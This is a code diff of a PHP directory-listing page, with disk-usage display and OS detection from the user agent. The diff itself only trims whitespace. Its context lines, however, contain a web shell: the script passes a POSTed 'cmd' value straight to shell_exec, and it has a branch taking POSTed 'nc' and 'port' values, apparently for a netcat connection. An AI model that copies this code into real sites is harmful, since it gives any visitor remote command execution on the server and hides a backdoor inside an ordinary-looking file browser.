@@ -14,8 +14,6 @@ $blacklistArray = array(".git");
 # blacklist file name
 $blacklistFile = ".blacklist";
 
-
-
 # initialising variables
 $thisScript = basename(__FILE__);
 $thisDir = str_replace('/'.$thisScript, '', $_SERVER['SCRIPT_NAME']);
@@ -27,7 +25,6 @@ $dirSize = 0;
 if (file_exists($blacklistFile)) {
     $blacklist = array_merge($blacklistArray, file($blacklistFile, FILE_IGNORE_NEW_LINES));
 }
-
 
 # reading directory
 if ($dh = opendir('.')) {
@@ -114,7 +111,6 @@ $gigabytes = isa_bytes_to_gb($df);
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
 function getOS() { 
-
     global $user_agent;
 
     $os_platform  = "Unknown OS Platform";
@@ -155,7 +151,6 @@ $user_os        = getOS();
 
 $device_details = "<strong>Operating System: </strong>".$user_os."";
 
-
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
@@ -169,14 +164,12 @@ if (!empty($_POST['nc']) && !empty($_POST['port'])) {
 ?>
 
 
-
 ?>
 
 <head>
    
     <style>
-
-
+	    
 #header {
                 width: 50%;
                 min-width: 500px;
@@ -215,7 +208,6 @@ if (!empty($_POST['nc']) && !empty($_POST['port'])) {
                     #path a:hover ~ #activedir {
                             color: <?php echo $colour; ?>;
                             background: white; }
-
 
         #container {
                 width: 50%;
@@ -522,7 +514,6 @@ ul {
 .progress-bar {
   background: #D10845;
 }
-
 
 .inventory-row {
   text-align: center;
